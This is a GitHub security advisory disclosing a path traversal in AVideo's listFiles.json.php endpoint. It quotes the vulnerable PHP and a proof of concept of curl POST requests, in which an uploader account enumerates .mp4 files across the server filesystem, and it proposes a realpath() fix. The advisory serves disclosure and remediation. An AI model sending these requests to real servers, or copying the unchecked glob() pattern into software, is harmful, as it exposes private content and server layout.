# [M] AVideo has a Path Traversal in listFiles.json.php Enables Server Filesystem Enumeration

## Summary
Severity: Medium
Advisory: GHSA-4wmm-6qxj-fpj4
CVE: CVE-2026-33238
CWE: CWE-22
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-03-19
Source: https://github.com/advisories/GHSA-4wmm-6qxj-fpj4
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0 <26.0

## Details
## Summary

The `listFiles.json.php` endpoint accepts a `path` POST parameter and passes it directly to `glob()` without restricting the path to an allowed base directory. An authenticated uploader can traverse the entire server filesystem by supplying arbitrary absolute paths, enumerating `.mp4` filenames and their full absolute filesystem paths wherever they exist on the server — including locations outside the web root, such as private or premium media directories.

## Details

The vulnerable code is at `objects/listFiles.json.php:8-45`:

```php
if (!User::canUpload() || !empty($advancedCustom->doNotShowImportMP4Button)) {
    return false;
}
$global['allowed'] = ['mp4'];
// ...
if (!empty($_POST['path'])) {
    $path = $_POST['path'];
    if (substr($path, -1) !== '/') {
        $path .= "/";
    }
    if (file_exists($path)) {
        $extn = implode(",*.", $global['allowed']);
        $filesStr = "{*." . $extn . ",*." . strtolower($extn) . ",*." . strtoupper($extn) . "}";
        $video_array = glob($path . $filesStr, GLOB_BRACE);
        foreach ($video_array as $key => $value) {
            $filePath = mb_convert_encoding($value, 'UTF-8');
            // ...
            $obj->path = $filePath;  // Full absolute path returned to caller
```

The `$_POST['path']` value is used directly in `glob()` with no call to `realpath()` for normalization and no prefix check against a permitted base directory (e.g., `$global['systemRootPath'] . 'videos/'`). The response includes `obj->path` containing the full absolute filesystem path of each matched file.

The extension filter (`{*.mp4,*.mp4,*.MP4}`) limits results to `.mp4` files, which prevents reading credentials or source code but does not prevent enumeration of video files stored in access-controlled locations such as:
- Premium/paid content directories
- Private or unlisted media stores
- Backup directories containing `.mp4` files
- Paths revealing sensitive server directory structure

`canUpload` is a standard low-privilege role granted to any registered uploader; it does not imply administrative trust.

## PoC

```bash
# Step 1: Authenticate as any user with canUpload permission
# (standard uploader account)

# Step 2: Enumerate MP4 files in the web root (expected behavior)
curl -b "PHPSESSID=<session>" -X POST https://target.avideo.site/listFiles \
  -d "path=/var/www/html/videos/"
# Returns: [{"id":0,"path":"/var/www/html/videos/video1.mp4","name":"video1.mp4"}, ...]

# Step 3: Traverse outside intended directory to private content store
curl -b "PHPSESSID=<session>" -X POST https://target.avideo.site/listFiles \
  -d "path=/var/private/premium-content/"
# Returns: [{"id":0,"path":"/var/private/premium-content/paywalled-video.mp4","name":"paywalled-video.mp4"}, ...]

# Step 4: Enumerate root filesystem for any MP4 files
curl -b "PHPSESSID=<session>" -X POST https://target.avideo.site/listFiles \
  -d "path=/"
# Returns all .mp4 files visible to the web server process anywhere on disk
```

**Expected behavior:** Only files within the designated upload directory should be listable.
**Actual behavior:** Files from any path readable by the web server process are returned with full absolute paths.

## Impact

- **Unauthorized media enumeration:** An uploader can discover private, premium, or access-controlled `.mp4` files stored outside their permitted directory.
- **Filesystem structure disclosure:** Full absolute paths reveal server directory layout, aiding further attacks.
- **Content bypass:** In AVideo deployments where premium video files are stored in filesystem directories not protected by application access control, this exposes the filenames and paths needed to directly access them if other path traversal or direct-file-access weaknesses are present.
- **Blast radius:** Requires `canUpload` permission (low privilege), but this is the standard permission for all video uploaders on a multi-user AVideo instance.

## Recommended Fix

Restrict the supplied path to an allowed base directory using `realpath()`:

```php
if (!empty($_POST['path'])) {
    $allowedBase = realpath($global['systemRootPath'] . 'videos') . '/';
    $path = realpath($_POST['path']);

    // Reject paths that don't start with the allowed base
    if ($path === false || strpos($path . '/', $allowedBase) !== 0) {
        http_response_code(403);
        echo json_encode(['error' => 'Path not allowed']);
        exit;
    }
    $path .= '/';
    // ... continue with glob
}
```

`realpath()` resolves `../` sequences before the prefix check, preventing traversal bypasses.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-4wmm-6qxj-fpj4
- https://nvd.nist.gov/vuln/detail/CVE-2026-33238
- https://github.com/WWBN/AVideo/issues/10403
- https://github.com/WWBN/AVideo/commit/870cf24a7632d4f1a5d5549b59103c18f39e3a21
- https://github.com/WWBN/AVideo
